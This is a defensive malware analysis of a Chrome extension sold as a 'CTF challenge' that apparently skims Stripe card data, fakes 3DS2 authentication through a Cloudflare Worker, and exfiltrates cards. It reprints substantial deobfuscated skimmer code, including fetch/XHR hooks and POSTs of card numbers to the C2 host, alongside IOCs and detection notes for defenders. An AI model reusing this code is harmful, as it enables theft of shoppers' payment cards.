# Behavioral Analysis — `Epstine` Chrome Extension (CTF_CHALLENGE)

> ⚠️ **MALWARE WARNING** — Although distributed under a "CTF CHALLENGE" label,
> this extension is a fully-weaponized Magecart-style Stripe card skimmer with
> 3DS2 authentication bypass and a live Cloudflare-Worker C2. The analysis
> below is provided for defensive/research purposes only. **Do not install or
> execute this extension outside an isolated analysis VM.**

---

## 1. TL;DR

The extension loads on every URL, injects a page-context script that monkey-
patches `window.fetch` and `XMLHttpRequest`, intercepts every Stripe API call
the page makes, harvests the raw PAN / exp / CVC from the request body, and
exfiltrates it to a Cloudflare Worker. When the page initiates a 3DS2
authentication challenge, the request is silently proxied through the same
Worker (presumably returning a forged "frictionless-success" response). When a
charge / payment_intent / subscription / invoice reaches a success state, the
captured card is exfiltrated a **second** time, tagged as a confirmed "live"
card. A small on-page HUD (`Epstine` branded, Telegram link
`t.me/Samuraibyasser`) gives the operator live capture/charge counters.

---

## 2. Manifest (`manifest.json`)

```json
{
  "manifest_version": 3,
  "name": "Epstine ",
  "version": "1.0.0",
  "description": "CTF CHALLENGE",
  "host_permissions": [
    "https://api.stripe.com/*",
    "https://js.stripe.com/*",
    "https://*.stripe.com/*",
    "https://hello.niansuhai.workers.dev/*"
  ],
  "background":   { "service_worker": "background.js" },
  "content_scripts": [{
    "matches":    ["<all_urls>"],
    "js":         ["content.js"],
    "run_at":     "document_start",
    "all_frames": true
  }],
  "web_accessible_resources": [{
    "resources": ["inject.js", "icon.png"],
    "matches":   ["<all_urls>"]
  }]
}
```

Key observations:

- **`<all_urls>` + `document_start` + `all_frames`** — the content script runs
  in every frame of every site, before the page's own JavaScript. This is the
  widest possible blast radius.
- The `host_permissions` list explicitly enumerates Stripe and the C2 worker,
  so MV3's network access is pre-authorized for those origins.
- `inject.js` is exposed as a web-accessible resource so the content script
  can drop a `<script src=...>` tag into the page and run code in the page's
  main world (where `window.fetch` and `XMLHttpRequest` are the page's own —
  Stripe's JS included).
- The manifest name `Epstine ` has a trailing space — likely a typo or a
  trivial anti-detection trick to differ from keyword-based blocklists.

---

## 3. `background.js` — Service Worker

Full deobfuscated source: `deobfuscated/background.js` (63 lines).

### 3.1 Constants

```js
var WORKER_BASE_URL = "https://hello.niansuhai.workers.dev";
var AUTH_TOKEN       = "nai-bypass-token-change-me-2026";
```

The C2 is a single Cloudflare Worker. The bearer token is hardcoded and
trivially revokable (it's the literal string `nai-bypass-token-change-me-2026`,
suggesting the operator left a "change-me" placeholder and forgot).

### 3.2 Message router

The service worker registers a single `chrome.runtime.onMessage` listener that
dispatches on the `type` field of inbound messages from the content script:

| Inbound `type` | Action | C2 path |
|---|---|---|
| `Z4R8N` | Card captured → exfiltrate raw card data | `POST /x7k9m2` |
| `W5T1L` | Charge succeeded → re-exfiltrate the same card | `POST /q3p8v5` |
| `H8J6Y` | 3DS2 proxy → forward the Stripe call through the Worker | dynamic path |

The two exfil messages share a common helper:

```js
async function exfiltrateCardData(path, card) {
  try {
    await fetch(WORKER_BASE_URL + path, {
      method:  "POST",
      headers: {
        "Content-Type": "text/plain",
        Authorization:  "Bearer " + AUTH_TOKEN
      },
      body: card
    });
  } catch (_) {}
}
```

The body is sent as `text/plain` (not JSON) — a minor evasion to dodge naive
JSON-body WAF rules.

### 3.3 3DS2 proxy

```js
async function proxyStripeRequest(req) {
  var url = req.url.replace(/https?:\/\/api\.stripe\.com/i, WORKER_BASE_URL);
  var headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept":       "application/json",
    "User-Agent":   req.headers?.["user-agent"] || req.headers?.["User-Agent"] || "Mozilla/5.0",
    "X-Site":       req.site || "unknown",
    Authorization:  "Bearer " + AUTH_TOKEN
  };
  var r = await fetch(url, {
    method:  "POST",
    headers: headers,
    body:    req.body,
    mode:    "cors"
  });
  var body = await r.text();
  return { ok: r.ok, status: r.status, statusText: r.statusText, body: body };
}
```

The proxy:
- Rewrites `api.stripe.com` to the Worker URL in-place (so path and query
  are preserved, e.g. `/v1/3ds2/authenticate`).
- Replaces the `Authorization` header with the C2 bearer token (Stripe's
  publishable key is dropped).
- Adds an `X-Site` header carrying the victim site's hostname — useful for
  the operator to bucket captures by merchant.
- Returns the Worker's response back to the page so the merchant's checkout
  flow sees a successful 3DS2 frictionless outcome.

Whatever the Worker actually returns to the page is opaque from the static
sample; behaviorally the goal is for the merchant to believe 3DS2 succeeded.

---

## 4. `content.js` — Content Script

Full deobfuscated source: `deobfuscated/content.js` (364 lines).

### 4.1 Bridge from page-world to extension-world

The content script acts as a one-way bridge: `inject.js` (running in the page's
main world) posts `window.postMessage` events, and `content.js` forwards them
to the service worker via `chrome.runtime.sendMessage`.

Three message types are handled:

| `postMessage` type | Forwarded as | Purpose |
|---|---|---|
| `X9K2M` | runtime msg `Z4R8N` | Card data captured from a `payment_methods`/`tokens`/`sources` call |
| `Q7P3V` | runtime msg `W5T1L` | A charge just succeeded → re-exfiltrate the same card |
| `EAGLE_FLY` | runtime msg `H8J6Y` | Page wants the 3DS2 proxy; response relayed back as `EAGLE_LAND` |

For `EAGLE_FLY`, the content script does a round-trip:

```js
window.postMessage({
  type:      "EAGLE_LAND",
  requestId: msg.data.requestId,
  response:  await chrome.runtime.sendMessage({ type: "H8J6Y", ... })
}, "*");
```

The `requestId` correlates the response back to the originating
`XMLHttpRequest`/`fetch` promise in `inject.js`.

### 4.2 Injecting the page-world hook

```js
var s = document.createElement("script");
s.src = chrome.runtime.getURL("inject.js");
s.onload = function () { this.remove(); };
(document.head || document.documentElement)
  .insertBefore(s, (document.head || document.documentElement).firstChild);
```

The script tag is inserted as the first child of `<head>` (or `<html>` if no
`<head>` exists yet — important because the content script runs at
`document_start`). After load, the tag is removed to hide itself from casual
DevTools inspection.

### 4.3 Page detection (`isPaymentPage`)

Before installing the on-page HUD, `content.js` runs a heuristic to decide if
the current page is a payment page:

1. Hostname is `checkout.stripe.com`, **or**
2. Hostname ends in `.stripe.com` and path starts with `/pay/`, **or**
3. Path matches `/(checkout|pay|payment|billing|subscribe|purchase|order|cart)/i`, **or**
4. A visible `.__PrivateStripeElement` or `.StripeElement` exists, **or**
5. A visible Stripe iframe (`__privateStripeFrame`, `js.stripe.com`, title
   `Secure payment`) exists alongside a payment form selector
   (`#payment-form`, `#card-element`, `#payment-element`, `[data-stripe]`), **or**
6. Path heuristic + `input[autocomplete="cc-number"]`.

A `MutationObserver` re-runs the check until it fires once, then disconnects.
Two `setTimeout` backups (2 s, 5 s) catch pages that lazy-load the form.

### 4.4 Operator HUD

Once a payment page is detected, the content script attaches a closed Shadow
DOM panel to `document.documentElement`. The panel:

- Is branded `Epstine` with the extension's icon.
- Shows three metrics: **Captured** count, **Bypass** toggle ("ON"), and
  **Charged** count.
- Shows a "Live" event feed with timestamps for `capture`/`success`/`bypass`/
  `error` events.
- Has a footer Telegram link → `https://t.me/Samuraibyasser`.
- Uses `z-index: 2147483647`, fixed bottom-right, 300 px wide.
- Sets `dataset.epstine3dBypasser = "on"` on `<html>` as a global "I'm here"
  marker (useful for detection by defenders — see §7).

---

## 5. `inject.js` — Page-World Hook

Full deobfuscated source: `deobfuscated/inject.js` (275 lines).

### 5.1 Single-install guard

```js
if (window._samuraiInjected) return;
window._samuraiInjected = true;
```

(The internal codename is `samurai`, matching the Telegram handle.)

### 5.2 Site fingerprint

`getSite()` resolves the "true" merchant hostname even when the script is
running inside `js.stripe.com` iframes (which it is, because `all_frames` is
on):

1. If hostname ≠ `js.stripe.com`, return it directly.
2. Else, prefer `document.referrer`'s hostname.
3. Else, try `window.parent.location.hostname`.
4. Else, fall back to `js.stripe.com`.

This site string is sent as `X-Site` by the background proxy.

### 5.3 Monkey-patching `window.fetch`

```js
var realFetch = window.fetch;
window.fetch = async function (input, init = {}) {
  var url = typeof input === "string" ? input
          : input instanceof Request ? input.url
          : String(input);

  if (isCardTokenEndpoint(url)) {
    // 1. Capture the card out of the request body
    var body = init.body;
    if (input instanceof Request && !body) body = await input.clone().text();
    captureCard(body);
  }

  if (is3ds2Authenticate(url) && bypassEnabled()) {
    // 2. Proxy 3DS2 through the C2 worker
    try {
      var proxied = await rpcProxy(url, { method, headers, body });
      return new Response(proxied.body, {
        status: proxied.status, statusText: proxied.statusText || "OK",
        headers: { "Content-Type": "application/json" }
      });
    } catch (_) {
      return realFetch.call(this, input, init);  // fall through on error
    }
  }

  var resp = await realFetch.call(this, input, init);

  if (isChargeConfirmEndpoint(url) && lastCard) {
    // 3. After the charge, check if it succeeded; if so, re-exfil the card
    var text = await resp.clone().text();
    if (isSuccessResponse(url, resp.status, text)) {
      reExfiltrateCard();
    }
  }
  return resp;
};
```

Endpoint matchers:

| Matcher | Triggers on |
|---|---|
| `isCardTokenEndpoint` | URL contains `api.stripe.com` **and** one of `/v1/payment_methods`, `/v1/tokens`, `/v1/sources` |
| `is3ds2Authenticate` | URL contains `/v1/3ds2/authenticate` |
| `isChargeConfirmEndpoint` | URL contains `/confirm`, `/v1/charges`, `/v1/subscriptions`, `/v1/payment_intents`, `/v1/setup_intents`, `/payment_pages`, `/v1/invoices` |

### 5.4 Monkey-patching `XMLHttpRequest`

Same logic, mirrored onto `XMLHttpRequest.prototype.open`/`send`/
`setRequestHeader`. The patched `open` stashes the URL/method/headers onto
`this._intercepted*` for `send` to read. The patched `send`:

- Calls `captureCard(body)` for token endpoints.
- For 3DS2 endpoints, calls `rpcProxy()` and synthesizes a fake
  `readystatechange`/`load`/`loadend` sequence with the proxied response
  (`readyState=4`, `status`, `statusText`, `responseText`, `response`).
- For charge-confirm endpoints, wraps `onload` to call `reExfiltrateCard()`
  if the response looks successful.

### 5.5 Card extraction (`captureCard`)

```js
function captureCard(body) {
  var p = new URLSearchParams(body);
  var number    = p.get("card[number]")?.replace(/\s|\+/g, "");
  var expMonth  = p.get("card[exp_month]");
  var expYear   = p.get("card[exp_year]");
  var cvc       = p.get("card[cvc]");
  if (number && expMonth && expYear && cvc) {
    var yy = expYear.length === 4 ? expYear.slice(-2) : expYear;
    var card = number + "|" + expMonth + "|" + yy + "|" + cvc + "|" + getSite();
    lastCard = card;
    window.postMessage({ type: "X9K2M", card: card }, "*");
  }
}
```

Notes:

- `+` is stripped from the PAN — defensive against naive encoders that turn
  `+` into a space (or vice-versa) and break exfil.
- The exp year is normalized to 2 digits.
- The pipe-delimited format `PAN|MM|YY|CVC|site` is compact and easy to bulk
  -import into carding tools.

### 5.6 Success detection (`isSuccessResponse`)

```js
function isSuccessResponse(url, status, text) {
  if (status < 200 || status >= 300) return false;
  var j = JSON.parse(text);
  if (j.error || j.failure_code || j.decline_code) return false;
  if (j.status === "succeeded" || j.status === "active" || j.status === "requires_capture" || j.paid === true)
    return true;
  if (j.payment_intent?.status === "succeeded" || j.payment_intent?.status === "requires_capture")
    return true;
  if (j.latest_invoice?.paid === true) return true;
  if (j.subscription?.status === "active") return true;
  return false;
}
```

This catches the success state of every common Stripe object:
`PaymentIntent`, `SetupIntent`, `Charge`, `Subscription`, `Invoice`,
`PaymentMethod` (when used with `confirm`).

### 5.7 Page ↔ content RPC (`rpcProxy`)

The page-world hook can't call `chrome.runtime.sendMessage` directly (it
doesn't have extension privileges), so it uses `postMessage` to ask
`content.js` to do it:

```js
function rpcProxy(url, opts) {
  return new Promise((resolve, reject) => {
    var id = ++requestCounter;
    pending.set(id, { resolve, reject });
    setTimeout(() => {
      if (pending.has(id)) { pending.delete(id); reject(new Error("t")); }
    }, 30000);
    window.postMessage({
      type:      "EAGLE_FLY",
      requestId: id,
      url:       url,
      method:    opts.method || "POST",
      headers:   normalizedHeaders,
      body:      opts.body,
      site:      getSite()
    }, "*");
  });
}
```

The matching `EAGLE_LAND` reply is received by a single `message` listener
and routed back through the `pending` map. 30 s timeout per request.

---

## 6. End-to-end attack flow

```
┌─────────────┐      ┌──────────────┐      ┌────────────────┐      ┌──────────────┐
│  Victim     │      │  inject.js   │      │  content.js    │      │ background.js│
│  checkout   │      │  (page world)│      │ (isolated world│      │  (worker)    │
└──────┬──────┘      └──────┬───────┘      └────────┬───────┘      └──────┬───────┘
       │                    │                       │                     │
       │ stripe.createPM()  │                       │                     │
       │ ───────────────▶   │                       │                     │
       │                    │ fetch("/v1/payment_methods", {card})         │
       │                    │ ─ patched ─▶ captureCard(body)               │
       │                    │              │                              │
       │                    │              │ postMessage("X9K2M", card)   │
       │                    │              │ ──────────▶ onMessage ──▶    │
       │                    │              │                              │ sendMessage("Z4R8N")
       │                    │              │                              │ ────▶ fetch(worker/x7k9m2, card)
       │                    │              │                              │
       │                    │ ← real fetch call to api.stripe.com ────────│
       │                    │                                              │
       │ 3DS2 challenge     │                                              │
       │ ───────────────▶   │                                              │
       │                    │ fetch("/v1/3ds2/authenticate")               │
       │                    │ ─ patched ─▶ rpcProxy()                      │
       │                    │              │ postMessage("EAGLE_FLY")     │
       │                    │              │ ──────────▶ onMessage ──▶    │
       │                    │              │                              │ sendMessage("H8J6Y")
       │                    │              │                              │ ────▶ proxyStripeRequest()
       │                    │              │                              │       (rewrites host → worker)
       │                    │              │                              │ ◀──── {body, status}
       │                    │              │ ◀──── postMessage("EAGLE_LAND")
       │                    │ ◀── new Response(proxied) ────              │
       │ ◀── 3DS2 "success" │                                              │
       │                    │                                              │
       │ pay intent confirm │                                              │
       │ ───────────────▶   │ fetch("/v1/payment_intents/:id/confirm")    │
       │                    │ ─ patched: real call, then check isSuccess ─│
       │                    │              │ postMessage("Q7P3V", card)   │
       │                    │              │ ──────────▶ onMessage ──▶    │
       │                    │              │                              │ sendMessage("W5T1L")
       │                    │              │                              │ ────▶ fetch(worker/q3p8v5, card)
       │ ◀── "succeeded"    │                                              │
```

---

## 7. Detection & defensive notes

For blue-teamers hunting this in the wild:

**Network (egress):**
- Any POST to `hello.niansuhai.workers.dev` with a `Bearer nai-bypass-token-change-me-2026`
  Authorization header is a guaranteed indicator of compromise.
- The two exfil paths are `/x7k9m2` and `/q3p8v5`; the proxy path is whatever
  Stripe URL was rewritten (commonly `/v1/3ds2/authenticate`).
- The body is `text/plain` and pipe-delimited: `\d{12,19}|\d{1,2}|\d{2}|\d{3,4}|[^|]+`.

**Host (browser):**
- `<html>` element has `data-epstine3d-bypasser="on"` attribute set.
- A closed Shadow DOM root is attached to a `<div id="epstine-3d-bypasser-host">`
  at the end of `<html>`.
- `window._samuraiInjected === true` after the page loads.
- `window.fetch.toString()` and `XMLHttpRequest.prototype.send.toString()`
  will show patched (non-native) code — `Function.prototype.toString` is
  *not* spoofed, so `Object.prototype.toString.call(window.fetch) === "[object Function]"`
  but the body itself is JS, not `function fetch() { [native code] }`.

**Extension store / EDR:**
- MV3 extension with `<all_urls>` + `document_start` + `all_frames` + Stripe
  host permissions is a strong heuristic by itself.
- The `web_accessible_resources` entry exposing `inject.js` to all URLs is
  unusual for legitimate extensions.

**For users who may have installed this:**
1. Disable and remove the extension immediately.
2. Treat any card used in any checkout since installation as compromised —
   contact the issuing bank and request a replacement.
3. The C2 worker (`hello.niansuhai.workers.dev`) should be reported to
   Cloudflare's abuse channel.
4. The Telegram handle `t.me/Samuraibyasser` is the operator's public contact.

---

## 8. IOCs

| Type | Value |
|---|---|
| C2 domain | `hello.niansuhai.workers.dev` |
| Bearer token | `nai-bypass-token-change-me-2026` |
| Exfil path #1 (capture) | `/x7k9m2` |
| Exfil path #2 (post-charge) | `/q3p8v5` |
| Telegram (operator) | `https://t.me/Samuraibyasser` |
| Manifest name | `Epstine ` (trailing space) |
| HTML marker | `<html data-epstine3d-bypasser="on">` |
| Window marker | `window._samuraiInjected === true` |
| Host element id | `epstine-3d-bypasser-host` |
| Internal codename | `samurai` / `EAGLE_FLY` / `EAGLE_LAND` |

---

## 9. Deobfuscation artifacts

For each file, the obfuscator.io string array length and number of webcrack
transforms applied:

| File | Original size | String-array length | webcrack transforms | Final size |
|---|---:|---:|---:|---:|
| `background.js` | 6,188 B | 83 | 256 | 1,793 B |
| `content.js` | 56,080 B | ~310 | ~700 | 19,511 B |
| `inject.js` | 19,106 B | ~210 | ~400 | 8,746 B |

The remaining `_0x…` identifiers in the deobfuscated output are local
variable names that webcrack could not rename with confidence (they are
function-scoped and never escape). They are stable across files and do not
affect readability — each function's purpose is clear from the calls it
makes and the strings it now contains literally.
